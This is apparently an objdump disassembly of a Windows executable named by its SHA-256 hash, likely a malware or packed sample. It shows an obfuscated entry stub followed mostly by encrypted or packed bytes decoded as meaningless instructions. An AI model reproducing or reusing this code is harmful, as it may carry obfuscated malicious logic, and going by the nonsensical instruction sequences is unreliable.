
34e1871f52e7b45d780e880c053cefa1586e1313c61919284bf4d7e7550eed37.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x70
  401006:	add    DWORD PTR ds:0x428277,edx
  40100c:	mov    eax,DWORD PTR [ebp-0x50]
  40100f:	cmp    DWORD PTR ds:0x42831f,0x0
  401016:	mov    DWORD PTR ds:0x4282ef,0x2f64
  401020:	not    ecx
  401022:	jmp    0x401482
  401027:	mov    DWORD PTR ds:0x42823f,0x2f16
  401031:	not    ecx
  401033:	cmp    DWORD PTR ds:0x42831f,0x0
  40103a:	jne    0x401066
  401040:	push   0x2daf
  401045:	call   DWORD PTR ds:0x428d74
  40104b:	mov    ecx,DWORD PTR ds:0x4283a7
  401051:	sub    DWORD PTR ds:0x42825b,ecx
  401057:	movzx  ecx,WORD PTR ds:0x428287
  40105e:	and    DWORD PTR ds:0x428243,ecx
  401064:	add    ecx,ecx
  401066:	mov    ecx,DWORD PTR ds:0x4281cf
  40106c:	xor    edx,edx
  40106e:	add    edx,DWORD PTR ds:0x4282c7
  401074:	sub    ecx,edx
  401076:	xor    ecx,DWORD PTR [ecx+edx*1]
  401079:	adc    DWORD PTR ds:0x42837f,0x71ea
  401083:	mov    ecx,DWORD PTR ds:0x4282ab
  401089:	mov    edx,DWORD PTR ds:0x4283ab
  40108f:	sub    edx,ecx
  401091:	xor    ecx,DWORD PTR [ecx+edx*1]
  401094:	adc    DWORD PTR ds:0x42830f,ebx
  40109a:	and    DWORD PTR ds:0x428257,0x4c59
  4010a4:	jmp    0x401482
  4010a9:	jae    0x4010a7
  4010ab:	ins    DWORD PTR es:[edi],dx
  4010ac:	mov    cl,0x5b
  4010ae:	and    DWORD PTR [ebx],esi
  4010b0:	cmp    ebp,DWORD PTR [edx+0x6cbefcb3]
  4010b6:	or     BYTE PTR [ebp+0x1818187c],al
  4010bc:	sbb    BYTE PTR [esi+0x2e181812],bl
  4010c2:	sahf   
  4010c3:	mov    ebp,0xf08ec0de
  4010c8:	mov    cl,0xf9
  4010ca:	clc    
  4010cb:	out    0x2e,al
  4010cd:	or     dl,bh
  4010cf:	mov    al,0xb1
  4010d1:	adc    BYTE PTR ds:0x5e7117f9,dl
  4010d7:	sbb    eax,0x648fe8fa
  4010dc:	(bad)  
  4010de:	mov    esp,0xa611f941
  4010e3:	and    eax,0x732a514e
  4010e8:	inc    edx
  4010e9:	mov    ds:0x95d8e3bf,eax
  4010ee:	cld    
  4010ef:	clc    
  4010f0:	sub    eax,0xcd39b412
  4010f5:	dec    eax
  4010f6:	pop    esi
  4010f7:	push   edx
  4010f8:	and    al,0x9
  4010fa:	fcomp  QWORD PTR [ebx-0x3e921a10]
  401100:	dec    esi
  401101:	inc    edx
  401102:	xchg   esp,eax
  401103:	retf   0x94f8
  401106:	xor    BYTE PTR [ebx],0x95
  401109:	jle    0x40110b
  40110b:	sti    
  40110c:	xchg   esi,eax
  40110d:	mov    DWORD PTR [ebx],ecx
  40110f:	arpl   WORD PTR fs:[ebp+esi*4-0x6c5f57e5],sp
  401117:	jmp    0x4010a3
  401119:	adc    DWORD PTR [edx],ebx
  40111b:	add    DWORD PTR [esi+ebx*1],ebp
  40111e:	mov    ebx,0x6513718d
  401123:	and    al,0xa3
  401125:	int    0x4e
  401127:	mov    bh,0x8d
  401129:	out    dx,al
  40112a:	in     eax,0x3c
  40112c:	xchg   BYTE PTR ds:0x39004482,bh
  401132:	(bad)  
  401133:	cli    
  401134:	pop    ebp
  401135:	not    BYTE PTR [edx]
  401137:	pop    ebp
  401138:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401139:	stos   DWORD PTR es:[edi],eax
  40113a:	out    0xa7,eax
  40113c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40113d:	pushf  
  40113e:	popf   
  40113f:	xchg   edi,eax
  401140:	dec    edi
  401141:	cdq    
  401142:	sar    BYTE PTR [eax-0x3d7a0810],cl
  401148:	pop    edi
  401149:	xchg   ebp,eax
  40114a:	cld    
  40114b:	pushf  
  40114c:	sub    al,0x67
  40114e:	mov    edi,0x4c425235
  401153:	enter  0x91ca,0x14
  401157:	mov    bh,0x9d
  401159:	add    al,0xa7
  40115b:	or     edx,DWORD PTR [edi-0x39784273]
  401161:	iret   
  401162:	mov    esp,0x5798c6de
  401167:	jns    0x4010fc
  401169:	mov    ds:0x88f58681,al
  40116e:	push   cs
  40116f:	loopne 0x401106
  401171:	xchg   esi,eax
  401172:	out    0x14,eax
  401174:	pop    eax
  401175:	pop    edi
  401176:	(bad)  
  401177:	scas   al,BYTE PTR es:[edi]
  401178:	and    bl,BYTE PTR [esi+0x463c1ccf]
  40117e:	inc    eax
  40117f:	mov    ds:0x2e4d813b,eax
  401184:	out    dx,al
  401185:	mov    esi,ecx
  401187:	and    ebx,esp
  401189:	and    al,bl
  40118b:	(bad)  
  40118c:	sbb    eax,0x30f0cbe
  401191:	sub    dh,ah
  401193:	test   al,0x88
  401195:	cmp    dh,BYTE PTR [eax+0x56]
  401198:	mov    BYTE PTR [ebx-0x7fe015c7],dl
  40119e:	aam    0x2d
  4011a0:	ins    DWORD PTR es:[edi],dx
  4011a1:	mov    ch,0x70
  4011a3:	adc    dl,BYTE PTR [esp+ecx*2]
  4011a6:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4011a8:	bound  eax,QWORD PTR [ebp-0x2b1240c6]
  4011ae:	lods   al,BYTE PTR ds:[esi]
  4011af:	mov    cl,0xf1
  4011b1:	jbe    0x4011a8
  4011b3:	stos   DWORD PTR es:[edi],eax
  4011b4:	inc    ebp
  4011b5:	js     0x401153
  4011b7:	pushf  
  4011b8:	pop    ecx
  4011b9:	cs pop es
  4011bb:	inc    esi
  4011bc:	jns    0x401143
  4011be:	ret    0x42c9
  4011c1:	jo     0x401226
  4011c3:	inc    edi
  4011c4:	lods   al,BYTE PTR ds:[esi]
  4011c5:	xor    BYTE PTR [ebx],ah
  4011c7:	mov    eax,ds:0x80992c0d
  4011cc:	xlat   BYTE PTR ds:[ebx]
  4011cd:	les    edi,FWORD PTR [edi+0x1f3646bc]
  4011d3:	add    eax,0x753badf5
  4011d8:	and    BYTE PTR [edi+0x66],cl
  4011db:	cmp    eax,0xb3fdf21a
  4011e0:	imul   esp,DWORD PTR [ecx-0x5d],0x23
  4011e4:	push   ecx
  4011e5:	cmp    al,0xf8
  4011e7:	xor    bh,bh
  4011e9:	mov    DWORD PTR ds:0x7c3e4fcb,esi
  4011ef:	sbb    dl,BYTE PTR [esi+ebp*2]
  4011f2:	cmp    cl,BYTE PTR cs:[ebx+0x1493fcbb]
  4011f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4011fa:	or     ecx,DWORD PTR [edi-0x6b]
  4011fd:	push   0x4b3a53f
  401202:	cmp    cl,al
  401204:	sahf   
  401205:	xor    edx,DWORD PTR [ebx-0x25fe7e92]
  40120b:	cmp    edi,DWORD PTR [bx+di-0xcae]
  401210:	pushf  
  401211:	add    BYTE PTR [ebx+0x33],dl
  401214:	in     al,dx
  401215:	lods   eax,DWORD PTR ds:[esi]
  401216:	mov    edx,0x7ed8465d
  40121b:	mov    eax,ds:0x53ec2747
  401220:	adc    DWORD PTR [ebp-0x63],0x83529a5d
  401227:	fsub   st(7),st
  401229:	outs   dx,DWORD PTR ds:[esi]
  40122a:	call   0x387f9177
  40122f:	xor    DWORD PTR [esi+0x6f49eda5],edi
  401235:	xor    ecx,DWORD PTR [ebp-0x28d5cedf]
  40123b:	leave  
  40123c:	mov    ds:0x3354272c,eax
  401241:	cmp    bh,BYTE PTR [esi+0x2e]
  401244:	adc    dh,BYTE PTR [esi-0x74]
  401247:	scas   al,BYTE PTR es:[edi]
  401248:	push   ebp
  401249:	fisub  WORD PTR [edx]
  40124b:	dec    edx
  40124c:	aas    
  40124d:	xchg   edx,eax
  40124e:	mov    dh,BYTE PTR [eax]
  401250:	push   esi
  401251:	ret    
  401252:	inc    di
  401254:	call   0x7735:0x3012a7a
  40125b:	lahf   
  40125c:	jge    0x401293
  40125e:	adc    BYTE PTR [ecx+0x1e65bbae],bl
  401264:	outs   dx,BYTE PTR ds:[esi]
  401265:	push   edi
  401266:	cmp    edx,DWORD PTR [esp+eiz*2-0x75]
  40126a:	pop    esp
  40126b:	shl    DWORD PTR [esi],0xa4
  40126e:	pop    esi
  40126f:	jecxz  0x4011fe
  401271:	in     eax,0x43
  401273:	cmp    DWORD PTR [eax-0x36],edx
  401276:	add    eax,0x9f1b0d47
  40127b:	dec    DWORD PTR [edi+0x65]
  40127e:	push   edx
  40127f:	test   BYTE PTR [ebx-0x36d8931c],0x9f
  401286:	daa    
  401287:	ins    BYTE PTR es:[edi],dx
  401288:	hlt    
  401289:	jb     0x4012f8
  40128b:	or     ebp,edi
  40128d:	xor    eax,0xb4a1ab55
  401292:	rcl    DWORD PTR [eax+0x239a4eea],0x75
  401299:	pop    ds
  40129a:	push   eax
  40129b:	(bad)  [eax-0x75]
  40129e:	je     0x401303
  4012a0:	mov    esi,0xf70d8814
  4012a5:	mov    al,0xaa
  4012a7:	cmp    eax,0x49f3f8f5
  4012ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4012ad:	sbb    eax,0x63f2d548
  4012b2:	aaa    
  4012b3:	scas   al,BYTE PTR es:[edi]
  4012b4:	adc    BYTE PTR [ebx-0x994304c],dh
  4012ba:	pop    ds
  4012bb:	push   ds
  4012bc:	aad    0x92
  4012be:	sahf   
  4012bf:	and    dl,BYTE PTR [ecx+edi*1+0x3fc5a762]
  4012c6:	adc    esp,edx
  4012c8:	hlt    
  4012c9:	jo     0x4012f7
  4012cb:	test   DWORD PTR [ecx-0x1b546b7e],eax
  4012d1:	add    al,0xac
  4012d3:	mov    BYTE PTR [ebx+0x5d5bac5d],dh
  4012d9:	repnz icebp 
  4012db:	push   ebp
  4012dc:	cli    
  4012dd:	xor    BYTE PTR [edx+0x4734ab9c],bh
  4012e3:	xor    ch,bl
  4012e5:	sahf   
  4012e6:	inc    edi
  4012e7:	retf   
  4012e8:	std    
  4012e9:	aam    0x3c
  4012eb:	jle    0x401312
  4012ed:	ficom  WORD PTR [eax+0x42266ccb]
  4012f3:	mov    eax,ds:0x17c3e61a
  4012f8:	pusha  
  4012f9:	jl     0x401376
  4012fb:	in     eax,dx
  4012fc:	(bad)  
  4012fd:	jmp    FWORD PTR [ecx+ecx*1]
  401300:	add    ebp,eax
  401302:	jecxz  0x401367
  401304:	test   BYTE PTR [ecx-0x20b4a656],0x9e
  40130b:	aaa    
  40130c:	inc    eax
  40130d:	push   esp
  40130e:	mul    edi
  401310:	jae    0x401326
  401312:	sbb    eax,0x40658973
  401317:	loope  0x401363
  401319:	mov    dl,0x0
  40131b:	fdivr  QWORD PTR [edx-0x4b562765]
  401321:	and    BYTE PTR [edi-0x34],bh
  401324:	push   esp
  401325:	int    0xda
  401327:	test   BYTE PTR [ebx],dh
  401329:	pop    es
  40132a:	rol    BYTE PTR [edx+0x73],0xf2
  40132e:	cli    
  40132f:	daa    
  401330:	inc    edx
  401331:	xchg   ebp,eax
  401332:	dec    esp
  401333:	data16 xlat BYTE PTR ds:[ebx]
  401335:	fild   WORD PTR [edi]
  401337:	push   0x4c434584
  40133c:	pop    edi
  40133d:	mov    eax,esp
  40133f:	dec    edx
  401340:	push   ss
  401341:	mov    esi,0x40d5886c
  401346:	repnz pusha 
  401348:	jle    0x401301
  40134a:	int    0x1c
  40134c:	adc    BYTE PTR [edi],0xd0
  40134f:	jge    0x40130f
  401351:	ja     0x401316
  401353:	popa   
  401354:	cmp    eax,DWORD PTR [ecx+0x55c02dfd]
  40135a:	adc    cl,ah
  40135c:	xchg   ecx,eax
  40135d:	outs   dx,DWORD PTR ds:[esi]
  40135e:	(bad)  
  40135f:	sti    
  401360:	mov    eax,DWORD PTR [esp+edx*4+0x34121a4b]
  401367:	int3   
  401368:	(bad)  
  401369:	stos   DWORD PTR es:[edi],eax
  40136a:	add    al,0xc2
  40136c:	test   esi,0xefe3c688
  401372:	sub    ebx,DWORD PTR [edx-0x432d1140]
  401378:	cmc    
  401379:	sub    ch,ch
  40137b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40137c:	push   eax
  40137d:	sbb    eax,0xac890d81
  401382:	mov    eax,0x608093b3
  401387:	imul   edi,DWORD PTR [ebx+0x590c79df],0xd2912c0d
  401391:	not    ebp
  401393:	jecxz  0x401353
  401395:	cmp    BYTE PTR [esi],dh
  401397:	fmul   st,st(7)
  401399:	loopne 0x401417
  40139b:	pop    esp
  40139c:	inc    ebx
  40139d:	icebp  
  40139e:	imul   esi,DWORD PTR [edx],0xfffffff3
  4013a1:	push   eax
  4013a2:	cli    
  4013a3:	add    esi,ebp
  4013a5:	pop    edx
  4013a6:	addr16 jg 0x4013f4
  4013a9:	ds fadd st,st(0)
  4013ac:	int3   
  4013ad:	(bad)  
  4013ae:	in     al,0x49
  4013b0:	xor    DWORD PTR [ebx-0x19],esi
  4013b3:	daa    
  4013b4:	stos   BYTE PTR es:[edi],al
  4013b5:	call   0xf6c2c80a
  4013ba:	mov    ds:0x5ed5dc31,eax
  4013bf:	nop
  4013c0:	inc    esi
  4013c1:	sub    DWORD PTR [ecx+eiz*4-0x4da8260e],ebp
  4013c8:	cmp    dh,dh
  4013ca:	sar    DWORD PTR [eax],1
  4013cc:	xchg   ebp,eax
  4013cd:	pop    edi
  4013ce:	adc    esi,DWORD PTR [edi+0x21]
  4013d1:	mov    ebx,0xd43e1a64
  4013d6:	xor    BYTE PTR [edx+0x2f],dh
  4013d9:	xor    cl,BYTE PTR [ebp+0x4c]
  4013dc:	mov    ds:0x9796453d,al
  4013e1:	mov    ecx,DWORD PTR [edi-0x6bb23f2e]
  4013e7:	and    ebx,esi
  4013e9:	repz out dx,eax
  4013eb:	mov    esi,0x6db899a1
  4013f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4013f1:	xor    eax,0xfdc1a5ee
  4013f6:	xchg   ebx,eax
  4013f7:	rcl    bl,cl
  4013f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4013fa:	in     eax,0x3d
  4013fc:	ins    BYTE PTR es:[edi],dx
  4013fd:	and    eax,0xfbca8b25
  401402:	push   cs
  401403:	jne    0x40139f
  401405:	mov    WORD PTR [edi+0x29],gs
  401408:	test   DWORD PTR [edi+ebp*2+0x61],esp
  40140c:	push   cs
  40140d:	nop
  40140e:	sub    dh,bl
  401410:	test   al,0x5a
  401412:	jns    0x401430
  401414:	ret    
  401415:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401416:	push   ebp
  401417:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401418:	jp     0x401419
  40141a:	jg     0x401483
  40141c:	xlat   BYTE PTR ds:[ebx]
  40141d:	xchg   esi,eax
  40141e:	repnz mov esi,fs
  401421:	in     eax,dx
  401422:	mov    eax,ds:0xf65b3b43
  401427:	pop    eax
  401428:	stos   BYTE PTR es:[edi],al
  401429:	and    eax,ecx
  40142b:	icebp  
  40142c:	scas   eax,DWORD PTR es:[edi]
  40142d:	and    ah,cl
  40142f:	and    al,0x79
  401431:	retf   
  401432:	call   0xd9a96763
  401437:	dec    ebx
  401438:	loope  0x401456
  40143a:	mov    es,edi
  40143c:	push   ds
  40143d:	mov    edx,0xb2a7ee67
  401442:	adc    dl,BYTE PTR [ecx]
  401444:	ins    DWORD PTR es:[edi],dx
  401445:	sub    al,BYTE PTR [ecx+eiz*8]
  401448:	dec    ebx
  401449:	jmp    0x563:0x3cfd0fab
  401450:	add    DWORD PTR [ebp-0x2626cdd0],esp
  401456:	mov    ecx,0x7105e0fd
  40145b:	jp     0x401455
  40145d:	or     ah,BYTE PTR [ecx-0x51d94edd]
  401463:	mov    BYTE PTR [esi+0x19],bh
  401466:	xchg   ebx,eax
  401467:	adc    bl,BYTE PTR [ebp+0x646aca47]
  40146d:	xchg   ebx,eax
  40146e:	xchg   ebx,eax
  40146f:	and    DWORD PTR ds:[eax-0x5f],ebx
  401473:	pop    esi
  401474:	out    dx,al
  401475:	or     cl,BYTE PTR [ecx+0x14]
  401478:	fwait
  401479:	mov    BYTE PTR [edi],0xd7
  40147c:	jbe    0x401476
  40147e:	mov    bh,0xd6
  401480:	ret    
  401481:	jbe    0x40140e
  401483:	dec    ebp
  401484:	mov    ah,0x8b
  401486:	push   ebp
  401487:	mov    al,0x2b
  401489:	ret    0x1589
  40148c:	outs   dx,DWORD PTR ds:[esi]
  40148d:	add    DWORD PTR [edx+0x0],0x57
  401491:	mov    edi,DWORD PTR [ebp-0x4c]
  401494:	mov    DWORD PTR [ebp-0x50],eax
  401497:	mov    edx,0x488c
  40149c:	sbb    ecx,edi
  40149e:	mov    DWORD PTR [ebp-0x4c],ecx
  4014a1:	mov    edx,DWORD PTR ds:0x4282ab
  4014a7:	mov    edx,DWORD PTR [edx]
  4014a9:	and    DWORD PTR ds:0x4282fb,edx
  4014af:	or     DWORD PTR [ebp-0x50],0xca78cc41
  4014b6:	or     DWORD PTR [ebp-0x4c],0x9c1b89e8
  4014bd:	and    DWORD PTR ds:0x42822b,0x6649
  4014c7:	mov    eax,DWORD PTR [ebp-0x58]
  4014ca:	add    ecx,0xa44
  4014d0:	mov    ecx,DWORD PTR [ebp-0x54]
  4014d3:	cmp    DWORD PTR ds:0x428253,0x0
  4014da:	mov    DWORD PTR ds:0x42822f,ecx
  4014e0:	mov    DWORD PTR ds:0x4282f3,0x3ae4
  4014ea:	mov    edi,0x1ebc
  4014ef:	mov    edx,0x7e4f
  4014f4:	jmp    0x40154f
  4014f9:	not    DWORD PTR ds:0x42816b
  4014ff:	mov    edx,0x300f
  401504:	cmp    DWORD PTR ds:0x428253,0x0
  40150b:	jae    0x401543
  401511:	push   0x1b93
  401516:	call   DWORD PTR ds:0x428d78
  40151c:	mov    edx,DWORD PTR ds:0x4282cb
  401522:	xor    edi,edi
  401524:	or     edi,DWORD PTR ds:0x428343
  40152a:	sub    edx,edi
  40152c:	or     edx,DWORD PTR [edx+edi*1]
  40152f:	xor    edx,edx
  401531:	add    edx,DWORD PTR ds:0x42819f
  401537:	mov    edi,DWORD PTR ds:0x428347
  40153d:	sub    edi,edx
  40153f:	imul   edx,DWORD PTR [edx+edi*1]
  401543:	and    edi,0x359a
  401549:	or     edi,0x3261
  40154f:	mov    edx,DWORD PTR [ebp-0x58]
  401552:	mov    edi,DWORD PTR [ebp-0x54]
  401555:	jmp    0x401933
  40155a:	outs   dx,DWORD PTR ds:[esi]
  40155b:	add    eax,0x3a5a4a0b
  401560:	das    
  401561:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401562:	out    dx,al
  401563:	sbb    ebx,DWORD PTR [ebp-0x5e6fdf90]
  401569:	jo     0x401509
  40156b:	adc    bl,BYTE PTR [eax]
  40156d:	sbb    BYTE PTR [esi+0x5f181812],bl
  401573:	jmp    FWORD PTR [esi]
  401575:	xor    BYTE PTR [ecx+edi*4-0x34dc5eb1],dh
  40157c:	inc    esi
  40157d:	(bad)  
  40157e:	fwait
  40157f:	int    0x85
  401581:	mov    edi,0x1e02647f
  401586:	cmp    cl,cl
  401588:	dec    esi
  401589:	fwait
  40158a:	xchg   edi,eax
  40158b:	sbb    al,0x6a
  40158d:	aaa    
  40158e:	jmp    0x4015e8
  401590:	pop    edi
  401591:	xor    eax,0xe9fd6398
  401596:	or     DWORD PTR [ebp-0xc],0xf2587790
  40159d:	(bad)  
  40159e:	(bad)  
  4015a0:	adc    DWORD PTR [edx],ecx
  4015a2:	cmp    al,0x3b
  4015a4:	push   ecx
  4015a5:	or     eax,edx
  4015a7:	add    BYTE PTR [eax+ebx*2],bl
  4015aa:	ret    
  4015ab:	inc    ebx
  4015ac:	adc    eax,0x4eb08517
  4015b1:	pushf  
  4015b2:	leave  
  4015b3:	lock cmp edx,ecx
  4015b6:	jns    0x4015e3
  4015b8:	aaa    
  4015b9:	fistp  QWORD PTR [edi-0x2c]
  4015bc:	dec    esi
  4015bd:	ror    BYTE PTR [eax+0x1adcbf37],1
  4015c3:	mov    esp,0x330865c2
  4015c8:	mov    esp,0x89b46c20
  4015cd:	and    DWORD PTR [eax+0x1fc0d66a],edx
  4015d3:	sar    BYTE PTR [edx+0x4],0x2a
  4015d7:	mov    ecx,0xa27be4bc
  4015dc:	or     dl,0xa2
  4015df:	mov    eax,0x4d198aa5
  4015e4:	stos   DWORD PTR es:[edi],eax
  4015e5:	jnp    0x401592
  4015e7:	enter  0xa643,0x4c
  4015eb:	and    edx,DWORD PTR [edi+0xc4c1e45]
  4015f1:	ss (bad) 
  4015f3:	push   edx
  4015f4:	xchg   ebp,eax
  4015f5:	sub    dl,BYTE PTR [edx+0x2b]
  4015f8:	outs   dx,DWORD PTR ds:[esi]
  4015f9:	or     al,0x90
  4015fb:	lock adc DWORD PTR [ecx+ebx*2-0x167d1ade],eax
  401603:	cli    
  401604:	inc    edx
  401605:	sbb    al,BYTE PTR [esi+0x51bd9f8e]
  40160b:	mov    eax,ds:0xa37a6304
  401610:	and    eax,0x363fc747
  401615:	lds    eax,FWORD PTR [ebp+ebp*4-0x4de52e3b]
  40161c:	xchg   esp,eax
  40161d:	cmp    edi,DWORD PTR [esi+esi*2]
  401620:	fisttp DWORD PTR [ebx+ebx*8-0x11a64c1b]
  401627:	pop    eax
  401628:	clc    
  401629:	push   0x31
  40162b:	fmul   QWORD PTR [edx+ebp*4-0xf6455ea]
  401632:	add    edx,DWORD PTR [ecx+0x52e04127]
  401638:	lds    esp,FWORD PTR [ebp-0x3b]
  40163b:	or     al,ch
  40163d:	xor    edx,esi
  40163f:	js     0x401699
  401641:	xor    BYTE PTR [ebx-0x1e],ch
  401644:	mov    ds:0xa733d2e9,eax
  401649:	or     edx,DWORD PTR [eax]
  40164b:	add    esi,esp
  40164d:	push   ss
  40164e:	xchg   DWORD PTR [ecx],esi
  401650:	inc    eax
  401651:	mov    ds:0x202fc1c6,al
  401656:	ja     0x4015e0
  401658:	jle    0x4015f1
  40165a:	jl     0x40169f
  40165c:	xchg   edx,eax
  40165d:	and    DWORD PTR [ebx+edx*8+0x29],ebx
  401661:	and    dh,al
  401663:	pushf  
  401664:	pop    esp
  401665:	cli    
  401666:	ins    BYTE PTR es:[edi],dx
  401667:	lahf   
  401668:	mov    WORD PTR [edi+edx*8],fs
  40166b:	sbb    eax,0xc5c788f6
  401670:	push   eax
  401671:	test   ebx,ecx
  401673:	out    dx,al
  401674:	push   edx
  401675:	inc    edi
  401676:	(bad)  
  401677:	push   ebx
  401678:	jo     0x401622
  40167a:	sub    ecx,esi
  40167c:	pop    esi
  40167d:	mov    WORD PTR [edi-0x64],sp
  401681:	int3   
  401682:	add    DWORD PTR [ecx-0x7954f466],esi
  401688:	mov    ch,0x7b
  40168a:	adc    al,0x81
  40168c:	mov    esi,0x307afc42
  401691:	scas   al,BYTE PTR es:[edi]
  401692:	push   ebx
  401693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401694:	add    ebp,DWORD PTR [edx+0x8]
  401697:	xchg   al,cl
  401699:	push   ebx
  40169a:	shr    DWORD PTR [ecx*4-0x2befbc60],1
  4016a1:	outs   dx,BYTE PTR ds:[esi]
  4016a2:	inc    ebp
  4016a3:	mov    ecx,0xac6d9930
  4016a8:	gs mov esi,0x9ee041ad
  4016ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016af:	pop    edx
  4016b0:	pop    ecx
  4016b1:	dec    edx
  4016b2:	mov    BYTE PTR [eax+eiz*4+0x3a],dl
  4016b6:	ror    BYTE PTR [eax+0x9],cl
  4016b9:	sub    eax,0xdcc79126
  4016be:	(bad)  
  4016bf:	sub    BYTE PTR [ebp+eax*1+0x16],ah
  4016c3:	test   al,0x30
  4016c5:	lea    ecx,[ecx]
  4016c7:	push   ecx
  4016c8:	jae    0x40165c
  4016ca:	jae    0x4016f4
  4016cc:	in     al,0x86
  4016ce:	sbb    al,0x44
  4016d0:	and    DWORD PTR [ebx-0x20975f4c],0x2eac92e7
  4016da:	and    bh,BYTE PTR [esi+ebp*4-0x451ca334]
  4016e1:	loop   0x4016cc
  4016e3:	cmp    eax,0x5ccd0a41
  4016e8:	mov    eax,ds:0x77fbe5a1
  4016ed:	add    ebx,DWORD PTR [eax+0x22f7778c]
  4016f3:	mov    dh,0x39
  4016f5:	out    dx,al
  4016f6:	or     DWORD PTR [ebx-0x2dd1ab77],0x2f1c176f
  401700:	out    0x1c,eax
  401702:	add    DWORD PTR [ebx+edx*2],eax
  401705:	add    BYTE PTR [esi],cl
  401707:	xchg   esi,eax
  401708:	mov    al,ds:0x5b7fccf8
  40170d:	ret    0x2459
  401710:	int    0x6d
  401712:	icebp  
  401713:	jge    0x40175e
  401715:	out    dx,eax
  401716:	cmc    
  401717:	xchg   ebp,eax
  401718:	adc    al,0x55
  40171a:	call   0x7e4b:0x8a6c9363
  401721:	scas   al,BYTE PTR es:[edi]
  401722:	lods   eax,DWORD PTR ds:[esi]
  401723:	adc    al,0xed
  401725:	cs inc edx
  401727:	out    0x1a,al
  401729:	outs   dx,BYTE PTR ds:[esi]
  40172a:	or     al,0x8d
  40172c:	cmp    eax,0x7ed45251
  401731:	push   eax
  401732:	adc    edi,DWORD PTR [edx+0x5a]
  401735:	xchg   ecx,eax
  401736:	outs   dx,DWORD PTR ds:[esi]
  401737:	or     ecx,DWORD PTR ds:0x86f87345
  40173d:	aam    0x47
  40173f:	sbb    BYTE PTR [ecx+eax*1],bh
  401742:	push   ss
  401743:	jl     0x401746
  401745:	push   edx
  401746:	sti    
  401747:	cmc    
  401748:	adc    eax,0xf469d018
  40174d:	fbld   TBYTE PTR [edi]
  40174f:	mov    ds:0x7147e61,eax
  401754:	pushf  
  401755:	pop    ss
  401756:	rcl    BYTE PTR [ebp+0x5bd2ec55],cl
  40175c:	rcr    BYTE PTR [edi+0x49],0xd0
  401760:	daa    
  401761:	(bad)  
  401762:	dec    edi
  401763:	add    bl,BYTE PTR [edi-0x7eb75e0]
  401769:	sub    bl,BYTE PTR [ecx+ebx*8-0x35]
  40176d:	sub    eax,0xb8afdb06
  401772:	jmp    0x40172b
  401774:	bound  ebx,QWORD PTR [edi]
  401776:	aad    0x6c
  401778:	jl     0x4017f4
  40177a:	repz jg 0x4017b1
  40177d:	aam    0x53
  40177f:	sbb    bh,BYTE PTR [ebx]
  401781:	cs mov al,0x5
  401784:	sub    DWORD PTR [ebx],edx
  401786:	xor    al,0xfd
  401788:	push   ecx
  401789:	dec    esp
  40178a:	fidivr WORD PTR [ebp+ebx*8-0x79f40b96]
  401791:	aas    
  401792:	pop    es
  401793:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401794:	and    BYTE PTR [ecx+0x59],ch
  401797:	hlt    
  401798:	dec    ebp
  401799:	jbe    0x4017f8
  40179b:	xor    al,0xc4
  40179d:	mov    ecx,DWORD PTR [esi-0x5261f24d]
  4017a3:	pop    esi
  4017a4:	fucomi st,st(7)
  4017a6:	mov    edx,DWORD PTR [eax+ecx*1+0x936d675]
  4017ad:	cmp    ch,BYTE PTR [edx]
  4017af:	sti    
  4017b0:	and    al,0x60
  4017b2:	lods   al,BYTE PTR ds:[esi]
  4017b3:	pop    eax
  4017b4:	inc    BYTE PTR [edi-0x60]
  4017b7:	mov    esi,esp
  4017b9:	jbe    0x4017a3
  4017bb:	dec    ebx
  4017bc:	pop    ebx
  4017bd:	pop    esp
  4017be:	jb     0x4017af
  4017c0:	ss mov esi,0x183a2530
  4017c6:	sti    
  4017c7:	cmp    esi,DWORD PTR [ecx]
  4017c9:	inc    esp
  4017ca:	adc    al,0xe7
  4017cc:	push   ss
  4017cd:	push   es
  4017ce:	xchg   esp,eax
  4017cf:	cmp    DWORD PTR [edx+0x608f9f91],edx
  4017d5:	std    
  4017d6:	or     al,0x61
  4017d8:	add    eax,0x5c4e017f
  4017dd:	rcl    DWORD PTR [ebx-0x78],0xb6
  4017e1:	push   ds
  4017e2:	add    BYTE PTR [edi],dh
  4017e4:	adc    eax,0xc020c31b
  4017e9:	mov    ah,0x9b
  4017eb:	(bad)  
  4017ec:	rcl    DWORD PTR [edx+ecx*8-0x37],1
  4017f0:	jns    0x401850
  4017f2:	xor    BYTE PTR [edx],0xed
  4017f5:	push   ss
  4017f6:	dec    ebp
  4017f7:	add    dh,ah
  4017f9:	sub    al,0x6d
  4017fb:	std    
  4017fc:	(bad)  
  4017fd:	call   0xb2db:0xf42c8588
  401804:	jle    0x401842
  401806:	pop    edx
  401807:	aam    0xbc
  401809:	add    bl,bh
  40180b:	pusha  
  40180c:	(bad)  
  40180d:	cli    
  40180e:	dec    edi
  40180f:	dec    ecx
  401810:	push   cs
  401811:	xchg   ecx,eax
  401812:	xchg   esi,eax
  401813:	xchg   edx,eax
  401814:	out    dx,al
  401815:	xchg   edx,eax
  401816:	div    DWORD PTR [ebp-0x6d8c4713]
  40181c:	out    0x7,eax
  40181e:	mov    dl,0x77
  401820:	lahf   
  401821:	sbb    al,0x72
  401823:	or     DWORD PTR [edi],ecx
  401825:	bound  ebp,QWORD PTR [esi]
  401827:	or     eax,0x33509098
  40182c:	enter  0xcee5,0xd4
  401830:	xor    al,0x2b
  401832:	pop    ss
  401833:	xchg   ebx,eax
  401834:	ret    
  401835:	aad    0xd5
  401837:	sar    DWORD PTR [edi-0x6bbf7bfe],cl
  40183d:	popf   
  40183e:	mul    BYTE PTR [ecx]
  401840:	sti    
  401841:	pop    ds
  401842:	adc    cl,ah
  401844:	and    al,0xda
  401846:	lock fwait
